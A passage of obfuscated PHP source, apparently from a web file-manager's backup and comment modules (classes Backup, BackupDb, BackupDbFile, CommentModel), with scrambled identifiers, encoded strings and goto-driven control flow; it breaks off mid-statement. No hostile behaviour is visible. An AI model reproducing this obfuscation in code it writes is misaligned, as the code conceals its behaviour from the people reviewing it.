$Fâ±ŠäÒğ[2015] => 0, $Fâ±ŠäÒğ[2016] => 0, $Fâ±ŠäÒğ[2017] => 0); } $b¡¨‘Œá¿[$Fâ±ŠäÒğ[1712]] -= 1980; return $b¡¨‘Œá¿[$Fâ±ŠäÒğ[1712]] << 25 | $b¡¨‘Œá¿[$Fâ±ŠäÒğ[2013]] << 21 | $b¡¨‘Œá¿[$Fâ±ŠäÒğ[2014]] << 16 | $b¡¨‘Œá¿[$Fâ±ŠäÒğ[2015]] << 11 | $b¡¨‘Œá¿[$Fâ±ŠäÒğ[2016]] << 5 | $b¡¨‘Œá¿[$Fâ±ŠäÒğ[2017]] >> 1; } protected function packFields($dÎÇêÎÆ¦Ó) { $e¡¿«¶ğ§” =& $_SERVER[í™]; $CÃ²•µÎ„‰ = $e¡¿«¶ğ§”[33]; $cåÔÓÍ—¹ğ = array(); foreach ($dÎÇêÎÆ¦Ó as $E»ïœŠİé) { $CÃ²•µÎ„‰ .= $E»ïœŠİé[0]; $cåÔÓÍ—¹ğ[] = $E»ïœŠİé[1]; } array_unshift($cåÔÓÍ—¹ğ, $CÃ²•µÎ„‰); return call_user_func_array($e¡¿«¶ğ§”[2018], $cåÔÓÍ—¹ğ); } protected function filterFilename($açÙ¨àÙ) { $dä—ãğâœ‚ =& $_SERVER[í™]; return str_replace(array($dä—ãğâœ‚[93], $dä—ãğâœ‚[4], $dä—ãğâœ‚[176], $dä—ãğâœ‚[69], $dä—ãğâœ‚[113], $dä—ãğâœ‚[910], $dä—ãğâœ‚[913], $dä—ãğâœ‚[271]), $dä—ãğâœ‚[70], $açÙ¨àÙ); } } class ZipStream { } goto f³óÏÌİ±î; bÆ®ååí“: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $e¨¤‘ä®—´ =& $_SERVER[í™]; self::$name = date($e¨¤‘ä®—´[669]); if (!($fñ‰ØŠŒÁÆ = Model($e¨¤‘ä®—´[670])->lastItem())) { $fñ‰ØŠŒÁÆ = $this->initData(); } else { self::$name = $fñ‰ØŠŒÁÆ[$e¨¤‘ä®—´[28]]; if ($fñ‰ØŠŒÁÆ[$e¨¤‘ä®—´[671]] == $e¨¤‘ä®—´[83]) { self::$name = date($e¨¤‘ä®—´[672]); $f‚µòß”¦— = 0; if (isset($fñ‰ØŠŒÁÆ[$e¨¤‘ä®—´[281]][$e¨¤‘ä®—´[167]][$e¨¤‘ä®—´[419]])) { $f‚µòß”¦— = (int) $fñ‰ØŠŒÁÆ[$e¨¤‘ä®—´[281]][$e¨¤‘ä®—´[167]][$e¨¤‘ä®—´[419]]; } if ($fñ‰ØŠŒÁÆ[$e¨¤‘ä®—´[28]] == self::$name) { Model($e¨¤‘ä®—´[670])->remove($fñ‰ØŠŒÁÆ[$e¨¤‘ä®—´[367]]); } $fñ‰ØŠŒÁÆ = $this->initData($f‚µòß”¦—, $fñ‰ØŠŒÁÆ[$e¨¤‘ä®—´[673]]); } else { $this->checkStore($fñ‰ØŠŒÁÆ[$e¨¤‘ä®—´[673]]); } } self::$option = $fñ‰ØŠŒÁÆ; } private function initData($dİ¾ö¼£× = 0, $aïÕ¡éŒÙ¸ = '') { goto e™Æ —Ó¾; fìÏÒ†âí: $c½×¥¼ÖÊÑ[$b¦¸Í¶„[367]] = $f±½ñ—Øïø; return $c½×¥¼ÖÊÑ; goto fŠµ‡­‡êÀ; e™Æ —Ó¾: $b¦¸Í¶„ =& $_SERVER[í™]; $d¥ ¡›´»½ = Model($b¦¸Í¶„[670])->config(); if ($aïÕ¡éŒÙ¸ && $d¥ ¡›´»½[$b¦¸Í¶„[673]] != $aïÕ¡éŒÙ¸) { $dİ¾ö¼£× = 0; } goto f‚¾Ë…ê¨; f‚¾Ë…ê¨: $this->checkStore($d¥ ¡›´»½[$b¦¸Í¶„[673]]); $c½×¥¼ÖÊÑ = array($b¦¸Í¶„[673] => $d¥ ¡›´»½[$b¦¸Í¶„[673]], $b¦¸Í¶„[28] => self::$name, $b¦¸Í¶„[671] => 0, $b¦¸Í¶„[674] => $d¥ ¡›´»½[$b¦¸Í¶„[674]], $b¦¸Í¶„[281] => array($b¦¸Í¶„[675] => array($b¦¸Í¶„[671] => 0), $b¦¸Í¶„[676] => array($b¦¸Í¶„[671] => 0, $b¦¸Í¶„[677] => 0, $b¦¸Í¶„[678] => 0, $b¦¸Í¶„[29] => $b¦¸Í¶„[33]), $b¦¸Í¶„[679] => array($b¦¸Í¶„[671] => 0, $b¦¸Í¶„[677] => 0, $b¦¸Í¶„[678] => 0), $b¦¸Í¶„[167] => array($b¦¸Í¶„[671] => 0, $b¦¸Í¶„[680] => 0, $b¦¸Í¶„[681] => 0, $b¦¸Í¶„[682] => 0, $b¦¸Í¶„[683] => 0, $b¦¸Í¶„[419] => $dİ¾ö¼£×)), $b¦¸Í¶„[684] => time(), $b¦¸Í¶„[449] => 0); $f±½ñ—Øïø = Model($b¦¸Í¶„[670])->insert($c½×¥¼ÖÊÑ); goto fìÏÒ†âí; fŠµ‡­‡êÀ: } private function checkStore($a‚³ŞÉ‹Ç) { $AèĞÚĞ”¨ =& $_SERVER[í™]; $EêšÎŠ”Š = Model($AèĞÚĞ”¨[685])->listData($a‚³ŞÉ‹Ç); Model($AèĞÚĞ”¨[685])->checkConfig($EêšÎŠ”Š); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[í™][670])->findByName(self::$name); } return self::$option; } public static function set($aÄî‹±™õ) { $BÂ¢ÉÀÕÄŠ =& $_SERVER[í™]; $A¬äø¢¾œ = self::get(); foreach ($aÄî‹±™õ as $C˜âªÚàî => $BÖ­‚›çÈÆ) { $eØ™¥óŸï = explode($BÂ¢ÉÀÕÄŠ[91], $C˜âªÚàî); $fÇ‚ô³ÔÄ„ = count($eØ™¥óŸï); switch ($fÇ‚ô³ÔÄ„) { case 1: $A¬äø¢¾œ[$eØ™¥óŸï[0]] = $BÖ­‚›çÈÆ; break; case 2: $A¬äø¢¾œ[$eØ™¥óŸï[0]][$eØ™¥óŸï[1]] = $BÖ­‚›çÈÆ; break; case 3: $A¬äø¢¾œ[$eØ™¥óŸï[0]][$eØ™¥óŸï[1]][$eØ™¥óŸï[2]] = $BÖ­‚›çÈÆ; break; } } Model($BÂ¢ÉÀÕÄŠ[670])->update($A¬äø¢¾œ[$BÂ¢ÉÀÕÄŠ[367]], $A¬äø¢¾œ); self::$option = $A¬äø¢¾œ; return self::$option; } public function keep() { $c‹µœ”¯–­ =& $_SERVER[í™]; $f±Ôø÷ìÁØ = self::get(); if ($f±Ôø÷ìÁØ[$c‹µœ”¯–­[281]][$c‹µœ”¯–­[675]][$c‹µœ”¯–­[671]] == $c‹µœ”¯–­[83]) { return; } $this->backupKeep($f±Ôø÷ìÁØ); self::set(array($c‹µœ”¯–­[686] => 1)); } private function backupKeep($Bô¹ÀÉ˜¿™) { goto DĞ½Øª°œ»; aòİÈ‡ƒê¶: $CïÔœ˜„®Û = 0; $fÇÕêÊÄõª = array(); foreach ($eæ…¦°ˆëá as $D°§´ÉŠ) { if ($CïÔœ˜„®Û >= 7) { break; } $fÇÕêÊÄõª[] = $D°§´ÉŠ[$c¡÷Ñ‚„ÏÂ[28]]; $CïÔœ˜„®Û++; } goto bªÍĞÓ ‹Á; bªÍĞÓ ‹Á: for ($CïÔœ˜„®Û = 0; $CïÔœ˜„®Û < 12; $CïÔœ˜„®Û++) { $fÇÕêÊÄõª[] = date($c¡÷Ñ‚„ÏÂ[687], strtotime("\55{$CïÔœ˜„®Û}\40\x6d\x6f\156\164\x68\x73")); } $fÇÕêÊÄõª = array_unique($fÇÕêÊÄõª); foreach ($eæ…¦°ˆëá as $D°§´ÉŠ) { if (!empty($D°§´ÉŠ[$c¡÷Ñ‚„ÏÂ[28]]) && in_array($D°§´ÉŠ[$c¡÷Ñ‚„ÏÂ[28]], $fÇÕêÊÄõª)) { continue; } Model($c¡÷Ñ‚„ÏÂ[670])->remove($D°§´ÉŠ[$c¡÷Ñ‚„ÏÂ[367]]); $DàÖÏÙ‹Ñ¼ = "\173\151\x6f\72{$Bô¹ÀÉ˜¿™[$c¡÷Ñ‚„ÏÂ[673]]}\175\x2f\144\141\x74\141\x62\141\163\145\57\142\141\x63\153\165\x70\x5f{$D°§´ÉŠ[$c¡÷Ñ‚„ÏÂ[28]]}"; IO::remove($DàÖÏÙ‹Ñ¼, !1); } goto B×ù„Ãó×Å; DĞ½Øª°œ»: $c¡÷Ñ‚„ÏÂ =& $_SERVER[í™]; $eæ…¦°ˆëá = Model($c¡÷Ñ‚„ÏÂ[670])->listData(); if (empty($eæ…¦°ˆëá)) { return; } goto aòİÈ‡ƒê¶; B×ù„Ãó×Å: } public function db() { goto CñÇ„æ±œ; bÁó„ÙÃä‹: $B×œŒÆä’õ = new BackupDb(); if (!$B×œŒÆä’õ->index()) { return !1; } self::set(array($fšÜÉÇÊ»Í[688] => 1)); goto aŠÚ°‚™…â; CñÇ„æ±œ: $fšÜÉÇÊ»Í =& $_SERVER[í™]; $c©’ØØã˜ = self::get(); if ($c©’ØØã˜[$fšÜÉÇÊ»Í[281]][$fšÜÉÇÊ»Í[676]][$fšÜÉÇÊ»Í[671]] == $fšÜÉÇÊ»Í[83]) { return !0; } goto bÁó„ÙÃä‹; aŠÚ°‚™…â: return !0; goto dÚ×Ì“è‡Ñ; dÚ×Ì“è‡Ñ: } public function dbFile() { goto D•à·âø§µ; eœÊŠçé†: $D³”Ò·¬‰¶ = new BackupDbFile(); if (!$D³”Ò·¬‰¶->index()) { return !1; } self::set(array($aÓ‚¼Æë÷Ê[689] => 1)); goto aö¯­Æñ“±; D•à·âø§µ: $aÓ‚¼Æë÷Ê =& $_SERVER[í™]; $Eùï¥»ŠÆ¡ = self::get(); if ($Eùï¥»ŠÆ¡[$aÓ‚¼Æë÷Ê[281]][$aÓ‚¼Æë÷Ê[679]][$aÓ‚¼Æë÷Ê[671]] == $aÓ‚¼Æë÷Ê[83]) { return !0; } goto eœÊŠçé†; aö¯­Æñ“±: return !0; goto Aå”Ò”øÆ; Aå”Ò”øÆ: } public function file() { $Bˆòó·¥í =& $_SERVER[í™]; $DÙì³ğŸ• = self::get(); if ($DÙì³ğŸ•[$Bˆòó·¥í[281]][$Bˆòó·¥í[167]][$Bˆòó·¥í[671]] == $Bˆòó·¥í[83]) { return !0; } if (!isset($DÙì³ğŸ•[$Bˆòó·¥í[674]]) || $DÙì³ğŸ•[$Bˆòó·¥í[674]] == $Bˆòó·¥í[470]) { $CÚïØÖÆ‡¤ = new BackupFile(); if (!$CÚïØÖÆ‡¤->index()) { return !1; } } self::set(array($Bˆòó·¥í[690] => 1, $Bˆòó·¥í[671] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto F·ñ õ¦Õ; a¼šÆ‡„•½: $c›²™Ñ… = array_diff($c›²™Ñ…, array($EîôÑ×óŸï[692], $EîôÑ×óŸï[693])); foreach ($c›²™Ñ… as $eŠ“¦İ¦çğ) { $fò¿÷íÛ‰ += $bš²™ÕßÁ£->model($eŠ“¦İ¦çğ)->count(); } $dÕÇ¿¯ãÍ‘ = new Task($EîôÑ×óŸï[694], $EîôÑ×óŸï[695], $fò¿÷íÛ‰, LNG($EîôÑ×óŸï[696]) . $EîôÑ×óŸï[697] . LNG($EîôÑ×óŸï[698])); goto Cì­°‰Œš; F·ñ õ¦Õ: $EîôÑ×óŸï =& $_SERVER[í™]; $b÷ğÃº‚à” = Backup::get(); self::$io = $b÷ğÃº‚à”[$EîôÑ×óŸï[673]]; goto eÌÙÇ¹; eÌÙÇ¹: self::$name = $b÷ğÃº‚à”[$EîôÑ×óŸï[28]]; $AÍÓÌñ®¹ = $GLOBALS[$EîôÑ×óŸï[6]][$EîôÑ×óŸï[17]]; $e’÷Á×‰ÉÔ = $this->_dbType($AÍÓÌñ®¹); goto EÂÛ‚–¯Æ¿; Cì­°‰Œš: foreach ($c›²™Ñ… as $eŠ“¦İ¦çğ) { $a¥ó²ÉùÚ¹ = $aø²ëìÉ . $eŠ“¦İ¦çğ . $EîôÑ×óŸï[699]; $CÊ§˜¯½îÆ = null; if ($eŠ“¦İ¦çğ == $EîôÑ×óŸï[700] && (!isset($b÷ğÃº‚à”[$EîôÑ×óŸï[674]]) || $b÷ğÃº‚à”[$EîôÑ×óŸï[674]] == $EîôÑ×óŸï[470])) { $CÊ§˜¯½îÆ = self::$io; } $C›ƒÍ¢­äÎ += $bš²™ÕßÁ£->sqlFromDb($eŠ“¦İ¦çğ, $a¥ó²ÉùÚ¹, $dÕÇ¿¯ãÍ‘, $CÊ§˜¯½îÆ); } $dÕÇ¿¯ãÍ‘->end(); $aŸ‘Øå£Çó = array($EîôÑ×óŸï[701] => $e’÷Á×‰ÉÔ, $EîôÑ×óŸï[688] => 1, $EîôÑ×óŸï[702] => $C›ƒÍ¢­äÎ, $EîôÑ×óŸï[703] => $C›ƒÍ¢­äÎ); goto F¦í…ò‚; Aå¿Å´±¸‰: mk_dir($aø²ëìÉ); $fò¿÷íÛ‰ = $C›ƒÍ¢­äÎ = 0; $c›²™Ñ… = $bš²™ÕßÁ£->db()->getTables(); goto a¼šÆ‡„•½; EÂÛ‚–¯Æ¿: $bš²™ÕßÁ£ = new DbManage($AÍÓÌñ®¹, $e’÷Á×‰ÉÔ); $aø²ëìÉ = TEMP_FILES . $EîôÑ×óŸï[691] . self::$name . $EîôÑ×óŸï[8]; del_dir($aø²ëìÉ); goto Aå¿Å´±¸‰; F¦í…ò‚: Backup::set($aŸ‘Øå£Çó); return !0; goto F±ø®ß¶°›; F±ø®ß¶°›: } private function _dbType($DÆ•§¥¾Âì) { goto EÆÍÅèÆôÎ; Aµ³§Àùâé: if ($AŒÅ­Û¼—È == $E‘õùÔ¯±å[705]) { $a¼±âÀğù› = explode($E‘õùÔ¯±å[4], $DÆ•§¥¾Âì[$E‘õùÔ¯±å[706]]); $AŒÅ­Û¼—È = $a¼±âÀğù›[0]; } $b‰‡øÑÜ×œ = array($E‘õùÔ¯±å[707] => $E‘õùÔ¯±å[9], $E‘õùÔ¯±å[708] => $E‘õùÔ¯±å[709]); if (isset($b‰‡øÑÜ×œ[$AŒÅ­Û¼—È])) { $AŒÅ­Û¼—È = $b‰‡øÑÜ×œ[$AŒÅ­Û¼—È]; } goto Dƒ“„²ëÖ·; Dƒ“„²ëÖ·: return $AŒÅ­Û¼—È; goto F°šö²›ºƒ; EÆÍÅèÆôÎ: $E‘õùÔ¯±å =& $_SERVER[í™]; $DÆ•§¥¾Âì = array_change_key_case($DÆ•§¥¾Âì); $AŒÅ­Û¼—È = $DÆ•§¥¾Âì[$E‘õùÔ¯±å[704]]; goto Aµ³§Àùâé; F°šö²›ºƒ: } } class BackupDbFile { public function __construct() { } public function index() { goto eøÓÕ‘˜²; Bí³¦Ù¢†: $c«æ´ëÂËà = TEMP_FILES . "\x62\141\x63\x6b\165\160\137{$dÅ÷–ƒ•ç}\57"; $Eàó›ªÊñ  = "\x7b\x69\157\x3a{$EåÖ©Üã£—[$F–„ïŒÖ¢[673]]}\175\x2f\x64\141\164\141\x62\141\x73\145\57"; IO::mkdir($Eàó›ªÊñ  . "\x62\141\143\153\165\x70\x5f{$dÅ÷–ƒ•ç}\57"); goto b‘É“Ñ’ÎÚ; eøÓÕ‘˜²: $F–„ïŒÖ¢ =& $_SERVER[í™]; $EåÖ©Üã£— = Backup::get(); $dÅ÷–ƒ•ç = $EåÖ©Üã£—[$F–„ïŒÖ¢[28]]; goto Bí³¦Ù¢†; bíƒ×õ¬Ú…: $a±°¼Æ¬³Ñ = CONTROLLER_DIR . $F–„ïŒÖ¢[714]; IO::copy($AàæäáÉÍ, $Eàó›ªÊñ  . "\x62\141\143\x6b\x75\x70\137{$dÅ÷–ƒ•ç}\x2f"); IO::copy($a±°¼Æ¬³Ñ, $Eàó›ªÊñ  . "\142\141\x63\x6b\x75\160\137{$dÅ÷–ƒ•ç}\x2f"); goto d¾Ü ÍŒä¨; d¾Ü ÍŒä¨: $f´øáæñÈ¶->end(); Backup::set(array($F–„ïŒÖ¢[715] => $câÅ‘ÁĞªÍ[$F–„ïŒÖ¢[77]])); return !0; goto DÚá´ßêÂ; FÓï³õÒÏÓ: Backup::set(array($F–„ïŒÖ¢[712] => $câÅ‘ÁĞªÍ[$F–„ïŒÖ¢[77]])); IO::move($c«æ´ëÂËà, $Eàó›ªÊñ ); $AàæäáÉÍ = CONTROLLER_DIR . $F–„ïŒÖ¢[713]; goto bíƒ×õ¬Ú…; b‘É“Ñ’ÎÚ: $f´øáæñÈ¶ = new TaskFileTransfer($F–„ïŒÖ¢[710], $F–„ïŒÖ¢[695], 0, LNG($F–„ïŒÖ¢[696]) . $F–„ïŒÖ¢[412] . LNG($F–„ïŒÖ¢[698]) . $F–„ïŒÖ¢[711]); $f´øáæñÈ¶->addPath($c«æ´ëÂËà); $câÅ‘ÁĞªÍ = IO::infoWithChildren($c«æ´ëÂËà); goto FÓï³õÒÏÓ; DÚá´ßêÂ: } } goto D‚µ„İ ÆÒ; FøòĞŠ™: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\164"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\155\145" => "\x63\157\155\155\x65\x6e\164\137\155\145\164\x61", "\155\x65\x74\141\x46\x69\x65\x6c\x64" => "\143\157\155\155\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($fÆˆ½§Ø¹²) { $bÖ©ÆÜ°¸ =& $_SERVER[í™]; if ($fÆˆ½§Ø¹²[$bÖ©ÆÜ°¸[2120]]) { $F–Øñë”Š = $this->where(array($bÖ©ÆÜ°¸[2121] => $fÆˆ½§Ø¹²[$bÖ©ÆÜ°¸[2120]]))->find(); if (!$F–Øñë”Š || $F–Øñë”Š[$bÖ©ÆÜ°¸[371]] != $fÆˆ½§Ø¹²[$bÖ©ÆÜ°¸[371]] || $F–Øñë”Š[$bÖ©ÆÜ°¸[458]] != $fÆˆ½§Ø¹²[$bÖ©ÆÜ°¸[458]]) { return !1; } $this->where(array($bÖ©ÆÜ°¸[2121] => $fÆˆ½§Ø¹²[$bÖ©ÆÜ°¸[2120]]))->setAdd($bÖ©ÆÜ°¸[2122], 1); } $fÆˆ½§Ø¹²[$bÖ©ÆÜ°¸[2123]] = 0; $fÆˆ½§Ø¹²[$bÖ©ÆÜ°¸[2122]] = 0; $fÆˆ½§Ø¹²[$bÖ©ÆÜ°¸[671]] = 1; return $this->add($fÆˆ½§Ø¹²); } public function remove($fğ·‰ÌÁÉÎ) { $d‘¸”å×ë =& $_SERVER[í™]; $AÏŒ‘Ô•ê¤ = array($d‘¸”å×ë[2121] => $fğ·‰ÌÁÉÎ); $eá¡‰î¡“î = $this->where($AÏŒ‘Ô•ê¤)->find(); if ($eá¡‰î¡“î[$d‘¸”å×ë[2120]]) { $this->where(array($d‘¸”å×ë[2121] => $eá¡‰î¡“î[$d‘¸”å×ë[2120]]))->setAdd($d‘¸”å×ë[2122], -1); } return $this->where($AÏŒ‘Ô•ê¤)->delete(); } public function edit($a¨º„Û‚‚å, $a §Ş¥¬Å) { $Eìßß‡¤’ =& $_SERVER[í™]; $b·ÏÏ‘Îˆ = array($Eìßß‡¤’[2121] => $a¨º„Û‚‚å); return $this->where($b·ÏÏ‘Îˆ)->save(array($Eìßß‡¤’[2124] => $a §Ş¥¬Å)); } public function prasise($EŞ×êÒŸŠ) { $F–·Û¯äåé =& $_SERVER[í™]; $Cˆ½ß¬“Øê = Model($F–·Û¯äåé[2125]); $F±‚»¥˜é÷ = array($F–·Û¯äåé[2121] => $EŞ×êÒŸŠ, $F–·Û¯äåé[1414] => USER_ID); $D´‹ßñ——È = $Cˆ½ß¬“Øê->where($F±‚»¥˜é÷)->find(); if (!$D´‹ßñ——È) { $Cˆ½ß¬“Øê->add($F±‚»¥˜é÷); $fÆ·¥Ü İ = $this->where(array($F–·Û¯äåé[2121] => $EŞ×êÒŸŠ))->setAdd($F–·Û¯äåé[2123], 1); } else { $Cˆ½ß¬“Øê->where($F±‚»¥˜é÷)->delete(); $fÆ·¥Ü İ = $this->where(array($F–·Û¯äåé[2121] => $EŞ×êÒŸŠ))->setAdd($F–·Û¯äåé[2123], -1); } return $fÆ·¥Ü İ; } public function targetInfo($d‚Œ•Â™†Ü, $aê×İ¢Ù›¿) { goto d¦¸ˆ¿‚µ†; dŒ¾ËøÅƒ™: return $bÏ“ôƒƒß; goto FÜ‚·İÇñä; d¦¸ˆ¿‚µ†: $BŸ½°åã¿— =& $_SERVER[í™]; $f‚á·‹áï® = array($BŸ½°åã¿—[523] => $d‚Œ•Â™†Ü, $BŸ½°åã¿—[524] => $aê×İ¢Ù›¿); $d‹“ ©ğáù = $this->where($f‚á·‹áï®)->count(); goto E®”…Ù¦ˆ; E®”…Ù¦ˆ: $A ˆÌÛ¡í£ = "\122\x49\x47\x48\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\143\x6f\155\x6d\x65\156\x74\x5f\160\162\x61\x69\163\145\40\x73\164\x61\162\40\157\x6e\x20\143\157\x6d\155\145\156\x74\56\x63\157\x6d\155\x65\x6e\164\111\x44\40\x3d\40\x73\164\141\162\56\x63\x6f\x6d\155\145\x6e\x74\x49\x44"; $C®òİçã‹ = $this->alias($BŸ½°åã¿—[341])->where($f‚á·‹áï®)->join($A ˆÌÛ¡í£, $BŸ½°åã¿—[2126])->count(); $bÏ“ôƒƒß = array($BŸ½°åã¿—[2127] => $d‹“ ©ğáù, $BŸ½°åã¿—[2128] => $C®òİçã‹); goto dŒ¾ËøÅƒ™; FÜ‚·İÇñä: } public function listData($cÓ“ãøõ‹) { $cöÙ¾°‘à =& $_SERVER[í™]; if (isset($cÓ“ãøõ‹[$cöÙ¾°‘à[2129]])) { if ($cÓ“ãøõ‹[$cöÙ¾°‘à[2129]]) { $cÓ“ãøõ‹[$cöÙ¾°‘à[2130]] = array($cöÙ¾°‘à[913], intval($cÓ“ãøõ‹[$cöÙ¾°‘à[2129]])); } unset($cÓ“ãøõ‹[$cöÙ¾°‘à[2129]]); } if (isset($cÓ“ãøõ‹[$cöÙ¾°‘à[2131]])) { if ($cÓ“ãøõ‹[$cöÙ¾°‘à[2131]]) { $cÓ“ãøõ‹[$cöÙ¾°‘à[2130]] = array($cöÙ¾°‘à[910], intval($cÓ“ãøõ‹[$cöÙ¾°‘à[2131]])); } unset($cÓ“ãøõ‹[$cöÙ¾°‘à[2131]]); } return $this->_listData($cÓ“ãøõ‹); } private function _listData($fàØâËóÕì) { $E“¨á¥ö‹¡ =& $_SERVER[í™]; $C‹„¶ğ£õ‹ = $this->where($fàØâËóÕì)->_makeOrder()->selectPage(100); $this->_listAppendParent($C‹„¶ğ£õ‹[$E“¨á¥ö‹¡[354]]); $this->_listAppendUser($C‹„¶ğ£õ‹[$E“¨á¥ö‹¡[354]]); $this->_listAppendMeta($C‹„¶ğ£õ‹[$E“¨á¥ö‹¡[354]]); return $C‹„¶ğ£õ‹; } private function _makeOrder() { $A•¤µ„ŠÜÃ =& $_SERVER[í™]; $Bá¯·ˆ…Œœ = array($A•¤µ„ŠÜÃ[2123], $A•¤µ„ŠÜÃ[2122], $A•¤µ„ŠÜÃ[187]); $DÈ—´°øè† = Input::get($A•¤µ„ŠÜÃ[407], $A•¤µ„ŠÜÃ[7], $A•¤µ„ŠÜÃ[389], $Bá¯·ˆ…Œœ); $EœÒÁÂºíè = Input::get($A•¤µ„ŠÜÃ[408], $A•¤µ„ŠÜÃ[7], $A•¤µ„ŠÜÃ[1416], array($A•¤µ„ŠÜÃ[2132], $A•¤µ„ŠÜÃ[405])); $EÓ­«éê¯Ï = $DÈ—´°øè† . $A•¤µ„ŠÜÃ[50] . $EœÒÁÂºíè; return $this->order($EÓ­«éê¯Ï); } private function _listAppendParent(&$D±Şô™Î­à) { goto F…À¢óºêê; F…À¢óºêê: $DÉø¯ŠÂ‹à =& $_SERVER[í™]; $E¥»šùíœ = array_unique(array_to_keyvalue($D±Şô™Î­à, $DÉø¯ŠÂ‹à[33], $DÉø¯ŠÂ‹à[2120])); $E¥»šùíœ = array_remove_value($E¥»šùíœ, $DÉø¯ŠÂ‹à[470]); goto aá¹ìæÅ¢ç; aá¹ìæÅ¢ç: if (!$E¥»šùíœ) { return; } $aÑ“íê„º… = $this->where(array($DÉø¯ŠÂ‹à[2121] => array($DÉø¯ŠÂ‹à[7], $E¥»šùíœ)))->select(); $aÑ“íê„º… = array_to_keyvalue($aÑ“íê„º…, $DÉø¯ŠÂ‹à[2130]); goto D¹íÃõ–è©; D¹íÃõ–è©: foreach ($D±Şô™Î­à as &$Fß¾Í‘æÅ„) { if (isset($aÑ“íê„º…[$Fß¾Í‘æÅ„[$DÉø¯ŠÂ‹à[2120]]])) { $Fß¾Í‘æÅ„[$DÉø¯ŠÂ‹à[2133]] = $aÑ“íê„º…[$Fß¾Í‘æÅ„[$DÉø¯ŠÂ‹à[2120]]]; } } goto cÔß³ Á; cÔß³ Á: } private function _listAppendUser(&$dèÆó…†¤) { goto aÑ÷à†ÇñÌ; aÑ÷à†ÇñÌ: $bìÂ›íÈ =& $_SERVER[í™]; $d´†µóª¤Ò = array_unique(array_to_keyvalue($dèÆó…†¤, $bìÂ›íÈ[33], $bìÂ›íÈ[1423])); $d´†µóª¤Ò = array_remove_value($d´†µóª¤Ò, $bìÂ›íÈ[470]); goto Aß©˜”•; DÊ¬Á¡Ãİ¨: foreach ($dèÆó…†¤ as &$D½íÏğ˜å¤) { $D½íÏğ˜å¤[$bìÂ›íÈ[537]] = $eÀ±ˆ§¸å[$D½íÏğ˜å¤[$bìÂ›íÈ[1423]]]; if (isset($D½íÏğ˜å¤[$bìÂ›íÈ[2133]])) { $D½íÏğ˜å¤[$bìÂ›íÈ[2133]][$bìÂ›íÈ[537]] = $eÀ±ˆ§¸å[$D½íÏğ˜å¤[$bìÂ›íÈ[2133]][$bìÂ›íÈ[1423]]]; } } goto eø‹’Õ¢”; Aß©˜”•: if (count($d´†µóª¤Ò) == 0) { return; } foreach ($dèÆó…†¤ as $D½íÏğ˜å¤) { if (isset($D½íÏğ˜å¤[$bìÂ›íÈ[2133]])) { $d´†µóª¤Ò[] = $D½íÏğ˜å¤[$bìÂ›íÈ[2133]][$bìÂ›íÈ[1423]]; } } $eÀ±ˆ§¸å = Model($bìÂ›íÈ[479])->userListInfo($d´†µóª¤Ò); goto DÊ¬Á¡Ãİ¨; eø‹’Õ¢”: } private function _listAppendMeta(&$aÍÅ¨È—ã) { goto fïëô·; B›¤ë„„‡í: if (!$D­‡Çàô) { return; } foreach ($aÍÅ¨È—ã as $f½ˆ¸ß²ëÉ) { if (isset($f½ˆ¸ß²ëÉ[$c£°ª‰ë¯‹[2133]])) { $D­‡Çàô[] = $f½ˆ¸ß²ëÉ[$c£°ª‰ë¯‹[2133]][$c£°ª‰ë¯‹[2130]]; } } $A×ğñÔ·Ó = $this->metaList($D­‡Çàô); goto e…ŠÏ²««; fïëô·: $c£°ª‰ë¯‹ =& $_SERVER[í™]; $D­‡Çàô = array_unique(array_to_keyvalue($aÍÅ¨È—ã, $c£°ª‰ë¯‹[33], $c£°ª‰ë¯‹[2130])); $D­‡Çàô = array_remove_value($D­‡Çàô, $c£°ª‰ë¯‹[470]); goto B›¤ë„„‡í; e…ŠÏ²««: if (!$A×ğñÔ·Ó) { return !1; } foreach ($aÍÅ¨È—ã as &$f½ˆ¸ß²ëÉ) { $f½ˆ¸ß²ëÉ[$c£°ª‰ë¯‹[417]] = $A×ğñÔ·Ó[$f½ˆ¸ß²ëÉ[$c£°ª‰ë¯‹[2130]]]; if (isset($f½ˆ¸ß²ëÉ[$c£°ª‰ë¯‹[2133]])) { $f½ˆ¸ß²ëÉ[$c£°ª‰ë¯‹[2133]][$c£°ª‰ë¯‹[417]] = $A×ğñÔ·Ó[$f½ˆ¸ß²ëÉ[$c£°ª‰ë¯‹[2133]][$c£°ª‰ë¯‹[2130]]]; } } goto f»ªâİ‘Ã¦; f»ªâİ‘Ã¦: } private function metaList($Bç³£Ëé”Ÿ) { goto A–¿–£ª‰æ; E÷³øì: $dÛ¤™¦İÀ½ = Model($CĞØ˜Ùä®[2134])->where($eáö´¡ĞÁª)->select(); $dÛ¤™¦İÀ½ = array_to_keyvalue_group($dÛ¤™¦İÀ½, $CĞØ˜Ùä®[2130]); foreach ($dÛ¤™¦İÀ½ as $aÑÆğ™ñÓç => $D›‹ˆã²å©) { $A¬¬Î¯’±ä = array(); foreach ($D›‹ˆã²å© as $c¬°‰¤¸º) { $A¬¬Î¯’±ä[$c¬°‰¤¸º[$CĞØ˜Ùä®[89]]] = $c¬°‰¤¸º[$CĞØ˜Ùä®[359]]; } $dÛ¤™¦İÀ½[$aÑÆğ™ñÓç] = $A¬¬Î¯’±ä; } goto B¥°ğ¥²’ğ; B¥°ğ¥²’ğ: return $dÛ¤™¦İÀ½ ? $dÛ¤™¦İÀ½ : array(); goto cí¿™ù§Ö•; A–¿–£ª‰æ: $CĞØ˜Ùä® =& $_SERVER[í™]; if (!$Bç³£Ëé”Ÿ) { return array(); } $eáö´¡ĞÁª = array($CĞØ˜Ùä®[2130] => array($CĞØ˜Ùä®[7], $Bç³£Ëé”Ÿ)); goto E÷³øì; cí¿™ù§Ö•: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\x6c\145"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\141\x6d\145" => 